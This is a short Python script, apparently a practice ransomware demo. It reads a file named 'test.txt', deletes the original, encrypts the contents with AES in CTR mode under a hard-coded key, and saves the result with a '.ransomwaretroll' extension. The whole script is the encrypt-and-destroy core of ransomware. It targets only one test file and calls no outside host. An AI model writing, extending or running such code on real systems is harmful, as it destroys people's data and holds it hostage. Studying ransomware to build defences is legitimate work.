import os
import pyaes

file_name = 'test.txt'
with open(file_name, 'rb') as file:
    file_data = file.read()


os.remove(file_name)
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + '.ransomwaretroll'
with open(f'{new_file}', 'wb') as new_file:
    new_file.write(crypto_data)
new_file.close()

